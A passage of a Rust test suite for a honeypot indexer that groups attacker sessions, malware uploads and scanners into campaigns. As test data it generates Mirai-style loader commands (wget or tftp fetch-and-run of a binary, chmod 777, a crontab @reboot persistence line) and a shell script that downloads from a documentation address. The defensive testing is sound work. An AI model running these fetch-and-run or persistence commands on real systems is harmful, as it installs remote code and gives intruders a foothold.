        "192.0.2.2",
        "telnet",
        t0() + Duration::minutes(5),
        &plain,
    )
    .await;
    // A third session sends only the encoded login lines; a fourth the same lines in plain text.
    for (ip, key) in [("192.0.2.3", true), ("192.0.2.4", false)] {
        let session = Uuid::now_v7();
        for (i, line) in ["enable", "system", "shell", "linuxshell"]
            .iter()
            .enumerate()
        {
            let metadata = if key {
                json!({ "command": xor9(line), "command_decoded": line, "xor_key": 9 })
            } else {
                json!({ "command": line })
            };
            append(
                &pool,
                ip,
                "telnet",
                SignalType::HoneypotCommandExec,
                t0() + Duration::minutes(10) + Duration::seconds(2 * i as i64),
                metadata,
                Some(session),
            )
            .await;
        }
    }
    end_runs(&pool, &["telnet"]).await;
    index_all(&pool).await;

    let found = sequences(&pool).await;
    assert_eq!(found.len(), 2, "{found:?}");
    // Both have two members (the encoded and the plain session of each family); sorted by label.
    assert_eq!(found[0], ("4 commands: shell entry only".to_string(), 2));
    assert!(found[1].0.starts_with("6 commands: >/var/run"), "{found:?}");
    assert_eq!(found[1].1, 2);
    let rep: Value = sqlx::query_scalar(
        "SELECT representative FROM campaign WHERE kind = 'command_sequence' AND member_count = 2 \
         AND label LIKE '6 commands%'",
    )
    .fetch_one(&pool)
    .await
    .unwrap();
    assert_eq!(rep["source_ip"], "192.0.2.1");
    // The shapes are the decoded text: the login lines, then the payload.
    assert_eq!(rep["shapes"][0], "enable");
    assert_eq!(rep["shapes"][3], MIRAI[0]);
    let first = &rep["encoded"][0];
    assert_eq!(
        (first["raw"].as_str(), first["key"].as_u64()),
        (Some("lghkel"), Some(9))
    );
    assert_eq!(first["decoded"], "enable");
}

// ---- rebuilding what an older fingerprint wrote ----

async fn non_command_rows(pool: &PgPool) -> Vec<String> {
    sqlx::query_scalar(
        "SELECT concat_ws('|', id, kind, key, label, representative::text, rep_event_id, \
                first_seen, last_seen, member_count, sightings, self_propagating) \
         FROM campaign WHERE kind <> 'command_sequence' ORDER BY id",
    )
    .fetch_all(pool)
    .await
    .unwrap()
}

/// A database indexed by the whole-run fingerprint is converted by the next indexing batches:
/// the old command-sequence campaigns and sessions go, the new ones are built from the ledger,
/// sample and scanner campaigns and indicators are not touched or double counted, and operator
/// decisions on the review queue stay.
#[sqlx::test(migrations = false)]
async fn a_database_built_with_the_old_fingerprint_is_rebuilt_in_place(pool: PgPool) {
    migrate(&pool).await;
    // A worm sample uploaded from two hosts, a scanner, a loader cut at different points, and a
    // download URL, so the rebuild has sample, scanner and indicator state to leave alone.
    let worm = sha_hex(b"rebuild worm");
    upload(&pool, "192.0.2.1", t0(), &worm, None).await;
    upload(&pool, "192.0.2.2", t0() + Duration::minutes(1), &worm, None).await;
    for (i, s) in ["catchall", "mssql", "adb"].iter().enumerate() {
        append(
            &pool,
            "198.51.100.77",
            s,
            SignalType::CatchallProbe,
            t0() + Duration::minutes(i as i64),
            json!({}),
            None,
        )
        .await;
    }
    for cut in [2usize, 5, 9, 16] {
        let ip = format!("203.0.113.{cut}");
        let session = Uuid::now_v7();
        for (i, c) in MIRAI[..cut].iter().enumerate() {
            command(
                &pool,
                &ip,
                "telnet",
                t0() + Duration::seconds(i as i64),
                session,
                c,
            )
            .await;
        }
        // The same session uploads a sample, which links to the loader's campaign.
        upload(
            &pool,
            &ip,
            t0() + Duration::seconds(30),
            &sha_hex(format!("loader body {cut}").as_bytes()),
            Some(session),
        )
        .await;
    }
    end_runs(&pool, &["telnet"]).await;
    index_all(&pool).await;
    let expected_sequences = sequences(&pool).await;
    assert!(!expected_sequences.is_empty());
    let before = non_command_rows(&pool).await;
    let expected_links: Vec<(String, String)> = sqlx::query_as(
        "SELECT c.label, s.sha256 FROM campaign_sample s JOIN campaign c ON c.id = s.campaign_id \
         WHERE c.kind = 'command_sequence' ORDER BY 1, 2",
    )
    .fetch_all(&pool)
    .await
    .unwrap();
    assert!(!expected_links.is_empty());
    let iocs_before: i64 = sqlx::query_scalar("SELECT count(*) FROM ioc")
        .fetch_one(&pool)
        .await
        .unwrap();

    // The operator's decisions: on review_queue, which no campaign table references.
    sqlx::query(
        "INSERT INTO review_queue (source_ip, score_at_surface, categories_at_surface, state) \
         VALUES ('203.0.113.16', 60, '{}'::jsonb, 'approved'), \
                ('203.0.113.9', 60, '{}'::jsonb, 'pending')",
    )
    .execute(&pool)
    .await
    .unwrap();

    // Put the database back in the state the previous build left: version 1 keys that no event
    // produces, a session row with a version 1 digest, and the cursor at the end of the ledger.
    sqlx::query("UPDATE campaign SET key = 'v1-' || key WHERE kind = 'command_sequence'")
        .execute(&pool)
        .await
        .unwrap();
    sqlx::query("UPDATE campaign_session SET chain = decode(repeat('ab', 32), 'hex')")
        .execute(&pool)
        .await
        .unwrap();
    sqlx::query("UPDATE campaign_cursor SET fingerprint_version = 1")
        .execute(&pool)
        .await
        .unwrap();
    let ledger_end: i64 = sqlx::query_scalar("SELECT max(id) FROM event")
        .fetch_one(&pool)
        .await
        .unwrap();

    // One small batch starts the rebuild: the cursor goes back and remembers where it was.
    let first = campaign::index_batch(&pool, 5).await.unwrap();
    assert_eq!(first, BatchOutcome::Indexed(5));
    let (cursor, until, version): (i64, Option<i64>, i32) = sqlx::query_as(
        "SELECT last_event_id, rebuild_until, fingerprint_version FROM campaign_cursor",
    )
    .fetch_one(&pool)
    .await
    .unwrap();
    assert_eq!(
        (until, version),
        (Some(ledger_end), campaign::FINGERPRINT_VERSION)
    );
    assert!(cursor < ledger_end);
    assert!(
        of_kind(&memberships(&pool).await, "command_sequence").len() < expected_sequences.len(),
        "the old campaigns are gone while the new ones are rebuilt"
    );
    assert_eq!(non_command_rows(&pool).await, before, "mid-rebuild");

    index_all(&pool).await;
    assert_eq!(sequences(&pool).await, expected_sequences);
    assert_eq!(non_command_rows(&pool).await, before, "after the rebuild");
    let links: Vec<(String, String)> = sqlx::query_as(
        "SELECT c.label, s.sha256 FROM campaign_sample s JOIN campaign c ON c.id = s.campaign_id \
         WHERE c.kind = 'command_sequence' ORDER BY 1, 2",
    )
    .fetch_all(&pool)
    .await
    .unwrap();
    assert_eq!(links, expected_links);
    let iocs_after: i64 = sqlx::query_scalar("SELECT count(*) FROM ioc")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(iocs_after, iocs_before);
    let (cursor, until): (i64, Option<i64>) =
        sqlx::query_as("SELECT last_event_id, rebuild_until FROM campaign_cursor")
            .fetch_one(&pool)
            .await
            .unwrap();
    assert_eq!((cursor, until), (ledger_end, None));
    let decisions: Vec<(String, String)> =
        sqlx::query_as("SELECT host(source_ip), state::text FROM review_queue ORDER BY 1")
            .fetch_all(&pool)
            .await
            .unwrap();
    assert_eq!(
        decisions,
        vec![
            ("203.0.113.16".to_string(), "approved".to_string()),
            ("203.0.113.9".to_string(), "pending".to_string()),
        ]
    );

    // And it happens once: the next batches find nothing to do.
    assert_eq!(
        campaign::index_batch(&pool, 100).await.unwrap(),
        BatchOutcome::Indexed(0)
    );
    assert_eq!(sequences(&pool).await, expected_sequences);
}

/// A new database has nothing to rebuild and is marked current at once.
#[sqlx::test(migrations = false)]
async fn a_new_database_is_current_without_a_rebuild(pool: PgPool) {
    migrate(&pool).await;
    let (version, until): (i32, Option<i64>) =
        sqlx::query_as("SELECT fingerprint_version, rebuild_until FROM campaign_cursor")
            .fetch_one(&pool)
            .await
            .unwrap();
    assert_eq!((version, until), (1, None));
    assert_eq!(
        campaign::index_batch(&pool, 10).await.unwrap(),
        BatchOutcome::Indexed(0)
    );
    let (version, until): (i32, Option<i64>) =
        sqlx::query_as("SELECT fingerprint_version, rebuild_until FROM campaign_cursor")
            .fetch_one(&pool)
            .await
            .unwrap();
    assert_eq!((version, until), (campaign::FINGERPRINT_VERSION, None));
}

// ---- incremental versus one pass ----

/// xorshift64*: a deterministic generator, so every case is reproducible from its seed.
struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 >> 12;
        self.0 ^= self.0 << 25;
        self.0 ^= self.0 >> 27;
        self.0.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }
    fn below(&mut self, n: u64) -> u64 {
        self.next() % n
    }
    fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[self.below(items.len() as u64) as usize]
    }
}

const IPS: [&str; 6] = [
    "192.0.2.1",
    "192.0.2.2",
    "198.51.100.3",
    "198.51.100.4",
    "203.0.113.5",
    "2001:db8::6",
];
const SENSORS: [&str; 4] = ["ssh", "telnet", "adb", "http"];
const SHAS: [&str; 3] = [
    "1111111111111111111111111111111111111111111111111111111111111111",
    "2222222222222222222222222222222222222222222222222222222222222222",
    "3333333333333333333333333333333333333333333333333333333333333333",
];

fn generated_command(rng: &mut Rng) -> String {
    let host = format!("203.0.113.{}", rng.below(250));
    match rng.below(10) {
        0 => "enable".into(),
        1 => "sh".into(),
        2 => format!(
            "/bin/busybox echo -ne '\\x{:02x}\\x{:02x}' >> .i",
            rng.below(256),
            rng.below(256)
        ),
        3 => format!(
            "wget http://{host}/i; chmod 777 i; ./i {host}:{}",
            rng.below(65535)
        ),
        4 => "uname -s -v -n -r -m".into(),
        5 => format!("echo {:032x} > /tmp/.m", rng.next()),
        6 => "cat > astats".into(),
        7 => format!(
            "(crontab -l; echo \"@reboot /tmp/w.sh\") | crontab -; echo {}",
            rng.below(3)
        ),
        8 => "ps aux | grep astats | grep -v grep | wc -l; rm -f /tmp/.m".into(),
        _ => format!("tftp -g -r x{} {host}", rng.below(3)),
    }
}

/// Appends one generated event and returns nothing; sessions are kept by the caller.
async fn generated_event(
    pool: &PgPool,
    rng: &mut Rng,
    at: DateTime<Utc>,
    sessions: &mut Vec<(Uuid, &'static str, &'static str)>,
) {
    let roll = rng.below(100);
    if roll < 55 {
        if sessions.is_empty() || rng.below(5) == 0 {
            sessions.push((
                Uuid::now_v7(),
                *rng.pick(&IPS),
                *rng.pick(&["ssh", "telnet"]),
            ));
        }
        let (session, ip, sensor) = *rng.pick(sessions);
        let metadata = match rng.below(20) {
            0 => json!({ "command": "<summary>", "command_summary": true }),
            1 => json!({ "command": "<binary channel data>", "flood": "binary" }),
            _ => json!({ "command": generated_command(rng) }),
        };
        append(
            pool,
            ip,
            sensor,
            SignalType::HoneypotCommandExec,
            at,
            metadata,
            Some(session),
        )
        .await;
    } else if roll < 65 {
        let session = (!sessions.is_empty() && rng.below(2) == 0).then(|| rng.pick(sessions).0);
        let ip = session
            .and_then(|s| sessions.iter().find(|x| x.0 == s).map(|x| x.1))
            .unwrap_or_else(|| *rng.pick(&IPS));
        upload(pool, ip, at, rng.pick(&SHAS), session).await;
    } else if roll < 72 {
        let url = format!("http://198.51.100.{}/bins/x{}", rng.below(3), rng.below(2));
        append(
            pool,
            rng.pick(&IPS),
            "telnet",
            SignalType::HoneypotFileDownload,
            at,
            json!({ "url": url }),
            None,
        )
        .await;
    } else if roll < 95 {
        // A classified brute-force signal has no session: it is tagged on its source alone.
        let signal = if rng.below(6) == 0 {
            SignalType::SshBruteForce
        } else {
            SignalType::CatchallProbe
        };
        append(
            pool,
            rng.pick(&IPS),
            rng.pick(&SENSORS),
            signal,
            at,
            json!({}),
            None,
        )
        .await;
    } else {
        append(
            pool,
            rng.pick(&IPS),
            rng.pick(&SENSORS),
            SignalType::HoneypotSessionEnd,
            at,
            json!({}),
            None,
        )
        .await;
    }
}

/// Every derived table, keyed by what identifies a row rather than by surrogate ids, as sorted text.
async fn snapshot(pool: &PgPool) -> BTreeMap<&'static str, Vec<String>> {
    let queries: [(&str, &str); 13] = [
        (
            "attack_tag",
            "SELECT concat_ws('|', host(source_ip), session_id, technique_id, rule_id, event_id, \
                matched, first_seen, last_seen, sightings) FROM attack_tag",
        ),
        (
            "campaign_attack_tag",
            "SELECT concat_ws('|', c.kind, c.key, t.technique_id, t.rule_id, t.event_id, \
                t.artifact_sha256, t.matched) \
                FROM campaign_attack_tag t JOIN campaign c ON c.id = t.campaign_id",
        ),
        (
            "campaign",
            "SELECT concat_ws('|', kind, key, label, representative::text, rep_event_id, \
                first_seen, last_seen, member_count, sightings, self_propagating, \
                min_shapes, max_shapes) FROM campaign",
        ),
        (
            "member",
            "SELECT concat_ws('|', c.kind, c.key, host(m.source_ip), m.first_seen, \
                m.last_seen, m.sightings, m.uploaded) FROM campaign_member m \
                JOIN campaign c ON c.id = m.campaign_id",
        ),
        (
            "member_day",
            "SELECT concat_ws('|', c.kind, c.key, d.day, host(d.source_ip)) \
                FROM campaign_member_day d JOIN campaign c ON c.id = d.campaign_id",
        ),
        (
            "sensor",
            "SELECT concat_ws('|', c.kind, c.key, s.sensor, s.sightings) \
                FROM campaign_sensor s JOIN campaign c ON c.id = s.campaign_id",
        ),
        (
            "sample",
            "SELECT concat_ws('|', c.kind, c.key, s.sha256) \
                FROM campaign_sample s JOIN campaign c ON c.id = s.campaign_id",
        ),
        (
            "session",
            "SELECT concat_ws('|', session_id, host(source_ip), sensor, run, first_seen, \
                last_seen, first_event_id, last_event_id, shapes, shape_chars, encode(last_shape, 'hex'), \
                encode(chain, 'hex'), payload, entry_shapes, campaign_key, closed, pending_samples::text, attack_pending::text) \
                FROM campaign_session",
        ),
        (
            "watermark",
            "SELECT concat_ws('|', sensor, observed) FROM campaign_watermark",
        ),
        (
            "window",
            "SELECT concat_ws('|', host(source_ip), window_start, sensors::text, crossed) \
                FROM campaign_scan_window",
        ),
        (
            "pending",
            "SELECT concat_ws('|', encode(url_hash, 'hex'), host(source_ip), sensor, event_id, \
                first_seen, last_seen, sightings) FROM campaign_pending_fetch",
        ),
        (
            "ioc",
            "SELECT concat_ws('|', kind, value, detail, artifact_sha256, event_id, host(source_ip), \
                first_seen, last_seen, sightings) FROM ioc",
        ),
        (
            "scan",
            "SELECT concat_ws('|', sha256, state) FROM ioc_artifact_scan",
        ),
    ];
    let mut out = BTreeMap::new();
    for (name, sql) in queries {
        let mut rows: Vec<String> = sqlx::query_scalar(sqlx::AssertSqlSafe(sql.to_string()))
            .fetch_all(pool)
            .await
            .unwrap();
        rows.sort();
        out.insert(name, rows);
    }
    out
}

async fn reset_index(pool: &PgPool) {
    sqlx::query(
        "TRUNCATE campaign, campaign_member, campaign_member_day, campaign_sensor, campaign_sample, \
                  campaign_session, campaign_watermark, campaign_scan_window, campaign_pending_fetch, \
                  ioc, ioc_artifact_scan, attack_tag, campaign_attack_tag RESTART IDENTITY",
    )
    .execute(pool)
    .await
    .unwrap();
    sqlx::query("UPDATE campaign_cursor SET last_event_id = 0")
        .execute(pool)
        .await
        .unwrap();
}

/// The sample and scanner memberships recomputed from the ledger by a different method: a SQL
/// aggregate over the uploads, and a walk over the events in id order for the scanner windows.
async fn ledger_oracle(pool: &PgPool) -> (BTreeSet<(String, String)>, BTreeSet<(String, String)>) {
    let samples: Vec<(String, String)> = sqlx::query_as(
        "SELECT DISTINCT metadata->>'sample_sha256', host(source_ip) FROM event \
         WHERE signal_type = 'honeypot_malware_upload'",
    )
    .fetch_all(pool)
    .await
    .unwrap();
    let rows: Vec<(String, String, DateTime<Utc>, String)> = sqlx::query_as(
        "SELECT host(source_ip), sensor, observed_at, signal_type::text FROM event ORDER BY id",
    )
    .fetch_all(pool)
    .await
    .unwrap();
    let mut windows: BTreeMap<(String, i64), BTreeSet<String>> = BTreeMap::new();
    let mut scanners = BTreeSet::new();
    for (ip, sensor, at, signal) in rows {
        if signal == "honeypot_session_end" {
            continue;
        }
        let set = windows
            .entry((
                ip.clone(),
                at.timestamp().div_euclid(campaign::SCANNER_WINDOW_SECS),
            ))
            .or_default();
        if set.len() >= SCANNER_MIN_SENSORS {
            continue;
        }
        set.insert(sensor);
        if set.len() == SCANNER_MIN_SENSORS {
            scanners.insert((set.iter().cloned().collect::<Vec<_>>().join(","), ip));
        }
    }
    (samples.into_iter().collect(), scanners)
}

/// One probe per sensor, from an address of its own, two hours after `at`: every sensor's clock
/// passes the sweep gap, so runs still open when the generator stopped are grouped and the
/// ledger oracle (which has no open runs) can be compared with.
async fn quiet_hours_later(pool: &PgPool, at: DateTime<Utc>) {
    for (i, sensor) in SENSORS.iter().enumerate() {
        append(
            pool,
            &format!("192.0.2.{}", 240 + i),
            sensor,
            SignalType::CatchallProbe,
            at + Duration::hours(2),
            json!({}),
            None,
        )
        .await;
    }
}

/// `(members, fewest shapes, most shapes)` per command-sequence campaign, from the stored rows.
async fn command_groups_in_db(pool: &PgPool) -> BTreeSet<(Vec<String>, i32, i32)> {
    let rows: Vec<(Vec<String>, i32, i32)> = sqlx::query_as(
        "SELECT array_agg(host(m.source_ip) ORDER BY host(m.source_ip)), c.min_shapes, c.max_shapes \
         FROM campaign c JOIN campaign_member m ON m.campaign_id = c.id \
         WHERE c.kind = 'command_sequence' GROUP BY c.id, c.min_shapes, c.max_shapes",
    )
    .fetch_all(pool)
    .await
    .unwrap();
    rows.into_iter().collect()
}

/// The command-sequence campaigns recomputed from the ledger by a different method: a walk over
/// the command events in id order that splits each session into runs at idle gaps, collapses
/// repeats, and groups runs by the tuple of their opening commands, with no hashing and no stored
/// state. Valid for ledgers whose sensor clocks move with the events, as the generator's do, where
/// the indexer's sweep of quiet runs cannot end a run the session would have continued.
async fn command_oracle_groups(pool: &PgPool) -> BTreeSet<(Vec<String>, i32, i32)> {
    use review::campaign::fingerprint::{KEY_SHAPES, is_entry, is_http_request, normalize};
    let rows: Vec<(String, String, DateTime<Utc>, Value)> = sqlx::query_as(
        "SELECT host(source_ip), session_id::text, observed_at, metadata FROM event \
         WHERE signal_type = 'honeypot_command_exec' AND session_id IS NOT NULL ORDER BY id",
    )
    .fetch_all(pool)
    .await
    .unwrap();
    struct Run {
        ip: String,
        shapes: Vec<String>,
        last: DateTime<Utc>,
    }
    let mut open: BTreeMap<String, Run> = BTreeMap::new();
    let mut done: Vec<Run> = Vec::new();
    for (ip, session, at, metadata) in rows {
        if metadata.get("flood").is_some() || metadata.get("command_summary").is_some() {
            continue;
        }
        let Some(command) = metadata.get("command").and_then(Value::as_str) else {
            continue;
        };
        let shape = normalize(command);
        if shape.is_empty() {
            continue;
        }
        if open
            .get(&session)
            .is_some_and(|r| (at - r.last).num_seconds() > campaign::SESSION_IDLE_SECS)
            && let Some(ended) = open.remove(&session)
        {
            done.push(ended);
        }
        let run = open.entry(session).or_insert_with(|| Run {
            ip,
            shapes: Vec::new(),
            last: at,
        });
        run.last = run.last.max(at);
        if run.shapes.last() != Some(&shape) {
            run.shapes.push(shape);
        }
    }
    done.extend(open.into_values());
    let mut groups: BTreeMap<Vec<String>, (BTreeSet<String>, i32, i32)> = BTreeMap::new();
    for run in done {
        if run.shapes.iter().map(|s| s.chars().count()).sum::<usize>()
            < campaign::MIN_RUN_CHARS as usize
        {
            continue;
        }
        let payload: Vec<&String> = run.shapes.iter().filter(|s| !is_entry(s)).collect();
        let opening: Vec<String> = match payload.first() {
            None => vec!["<entry only>".to_string()],
            Some(first) if is_http_request(first) => vec!["<http>".to_string()],
            Some(_) => payload
                .iter()
                .take(KEY_SHAPES as usize)
                .map(|s| s.to_string())
                .collect(),
        };
        // Commands, not login lines (a run of login lines only counts those).
        let n = if payload.is_empty() {
            run.shapes.len()
        } else {
            payload.len()
        } as i32;
        let entry = groups
            .entry(opening)
            .or_insert_with(|| (BTreeSet::new(), n, n));
        entry.0.insert(run.ip);
        entry.1 = entry.1.min(n);
        entry.2 = entry.2.max(n);
    }
    groups
        .into_values()
        .map(|(ips, fewest, most)| (ips.into_iter().collect(), fewest, most))
        .collect()
}

#[sqlx::test(migrations = false)]
async fn incremental_indexing_equals_one_pass_over_the_same_ledger(pool: PgPool) {
    migrate(&pool).await;
    let mut kinds_seen = BTreeSet::new();
    let mut runs_ended_by_gap = false;
    for seed in 1..=12u64 {
        reset_index(&pool).await;
        let mut rng = Rng(seed.wrapping_mul(0x9E37_79B9_7F4A_7C15) | 1);
        let mut sessions = Vec::new();
        let mut at = t0() + Duration::days(seed as i64);
        for _ in 0..90 {
            // Mostly seconds apart, sometimes past the idle gap or the scanner window.
            at += match rng.below(12) {
                0 => Duration::seconds(700 + rng.below(4000) as i64),
                _ => Duration::seconds(rng.below(90) as i64),
            };
            generated_event(&pool, &mut rng, at, &mut sessions).await;
            if rng.below(6) == 0 {
                campaign::index_batch(&pool, 1 + rng.below(25) as i64)
                    .await
                    .unwrap();
            }
        }
        quiet_hours_later(&pool, at).await;
        at += Duration::hours(3);
        while campaign::index_batch(&pool, 1 + rng.below(25) as i64)
            .await
            .unwrap()
            != BatchOutcome::Indexed(0)
        {}
        let incremental = snapshot(&pool).await;

        let (samples, scanners) = ledger_oracle(&pool).await;
        let members = memberships(&pool).await;
        let uploaded: BTreeSet<(String, String)> = sqlx::query_as(
            "SELECT c.key, host(m.source_ip) FROM campaign_member m \
             JOIN campaign c ON c.id = m.campaign_id WHERE c.kind = 'sample' AND m.uploaded",
        )
        .fetch_all(&pool)
        .await
        .unwrap()
        .into_iter()
        .collect();
        assert_eq!(
            uploaded, samples,
            "seed {seed}: sample members against the ledger"
        );
        let scanner_members: BTreeSet<(String, String)> = members
            .iter()
            .filter(|((k, _), _)| k == "scanner")
            .flat_map(|((_, key), ips)| ips.iter().map(move |ip| (key.clone(), ip.clone())))
            .collect();
        assert_eq!(
            scanner_members, scanners,
            "seed {seed}: scanner members against the ledger"
        );
        let miscounted: i64 = sqlx::query_scalar(
            "SELECT count(*) FROM campaign c WHERE member_count <> \
             (SELECT count(*) FROM campaign_member m WHERE m.campaign_id = c.id)",
        )
        .fetch_one(&pool)
        .await
        .unwrap();
        assert_eq!(
            miscounted, 0,
            "seed {seed}: member_count against the member rows"
        );
        let from_ledger = command_oracle_groups(&pool).await;
        assert!(
            !from_ledger.is_empty(),
            "seed {seed}: the generator produced no command-sequence campaign"
        );
        assert_eq!(
            from_ledger,
            command_groups_in_db(&pool).await,
            "seed {seed}: command-sequence campaigns against the ledger"
        );

        reset_index(&pool).await;
        let ledger: i64 = sqlx::query_scalar("SELECT count(*) FROM event")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(
            campaign::index_batch(&pool, 1_000_000).await.unwrap(),
            BatchOutcome::Indexed(ledger as usize)
        );
        let one_pass = snapshot(&pool).await;
        for (table, rows) in &incremental {
            assert_eq!(rows, &one_pass[table], "seed {seed}: table {table} differs");
        }

        // A database the previous fingerprint built, converted while the ledger keeps growing:
        // the old command-sequence state is replaced, events that arrive mid-rebuild are indexed
        // by the ordinary rules, and the result is what one pass over everything gives.
        sqlx::query("UPDATE campaign SET key = 'v1-' || key WHERE kind = 'command_sequence'")
            .execute(&pool)
            .await
            .unwrap();
        sqlx::query(
            "UPDATE campaign_session SET chain = decode(repeat('ab', 32), 'hex'), payload = 0",
        )
        .execute(&pool)
        .await
        .unwrap();
        sqlx::query("UPDATE campaign_cursor SET fingerprint_version = 1")
            .execute(&pool)
            .await
            .unwrap();
        for _ in 0..3 {
            campaign::index_batch(&pool, 1 + rng.below(25) as i64)
                .await
                .unwrap();
        }
        for _ in 0..30 {
            at += Duration::seconds(rng.below(90) as i64);
            generated_event(&pool, &mut rng, at, &mut sessions).await;
            if rng.below(5) == 0 {
                campaign::index_batch(&pool, 1 + rng.below(25) as i64)
                    .await
                    .unwrap();
            }
        }
        quiet_hours_later(&pool, at).await;
        while campaign::index_batch(&pool, 1 + rng.below(25) as i64)
            .await
            .unwrap()
            != BatchOutcome::Indexed(0)
        {}
        let rebuilt = snapshot(&pool).await;
        reset_index(&pool).await;
        campaign::index_batch(&pool, 1_000_000).await.unwrap();
        let grown = snapshot(&pool).await;
        for (table, rows) in &rebuilt {
            assert_eq!(
                rows, &grown[table],
                "seed {seed}: rebuilt table {table} differs"
            );
        }
        assert_eq!(
            command_oracle_groups(&pool).await,
            command_groups_in_db(&pool).await,
            "seed {seed}: command-sequence campaigns against the ledger, after the rebuild"
        );
        assert!(
            !incremental["campaign"].is_empty() && !incremental["session"].is_empty(),
            "seed {seed}: the generator produced nothing to compare"
        );
        assert!(
            !incremental["attack_tag"].is_empty() && !incremental["campaign_attack_tag"].is_empty(),
            "seed {seed}: the generator produced no ATT&CK tags to compare"
        );
        for row in &incremental["campaign"] {
            kinds_seen.insert(row.split('|').next().unwrap_or_default().to_string());
        }
        runs_ended_by_gap |= incremental["session"]
            .iter()
            .any(|r| r.split('|').nth(3).is_some_and(|run| run != "0"));
    }
    // The cases exercised every rule, and runs ended mid-session, not only at the final sweep.
    assert_eq!(
        kinds_seen,
        ["command_sequence", "sample", "scanner"]
            .into_iter()
            .map(String::from)
            .collect::<BTreeSet<_>>()
    );
    assert!(runs_ended_by_gap);
}

#[sqlx::test(migrations = false)]
async fn a_second_indexer_is_locked_out_while_one_holds_the_lock(pool: PgPool) {
    migrate(&pool).await;
    upload(&pool, "192.0.2.90", t0(), SHAS[0], None).await;
    let mut holder = pool.begin().await.unwrap();
    let held: bool = sqlx::query_scalar("SELECT pg_try_advisory_xact_lock(7265646772697400015)")
        .fetch_one(&mut *holder)
        .await
        .unwrap();
    assert!(held);
    assert_eq!(
        campaign::index_batch(&pool, 10).await.unwrap(),
        BatchOutcome::LockedOut
    );
    holder.rollback().await.unwrap();
    assert_eq!(
        campaign::index_batch(&pool, 10).await.unwrap(),
        BatchOutcome::Indexed(1)
    );
}

/// The daemon's tick: nothing at all when asked to stop, otherwise every pass in one call.
#[sqlx::test(migrations = false)]
async fn a_tick_runs_every_pass_and_stops_when_asked(pool: PgPool) {
    migrate(&pool).await;
    let spool = tempfile::tempdir().unwrap();
    let body = b"#!/bin/sh\nwget http://198.51.100.5/x\n";
    let sha = sha_hex(body);
    std::fs::write(spool.path().join(&sha), body).unwrap();
    upload(&pool, "192.0.2.91", t0(), &sha, None).await;
    let dirs: Vec<(&'static str, PathBuf)> = vec![("ssh", spool.path().to_path_buf())];

    let stopped = campaign::run_tick(&pool, &dirs, &|| true).await;
    assert_eq!(stopped, campaign::TickStats::default());
    let cursor: i64 = sqlx::query_scalar("SELECT last_event_id FROM campaign_cursor")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(cursor, 0);

    let stats = campaign::run_tick(&pool, &dirs, &|| false).await;
    assert_eq!((stats.batches, stats.events, stats.caught_up), (1, 1, true));
    assert_eq!(stats.artifacts_scanned, 1);
    let url: String = sqlx::query_scalar("SELECT value FROM ioc WHERE artifact_sha256 = $1")
        .bind(&sha)
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(url, "http://198.51.100.5/x");
}
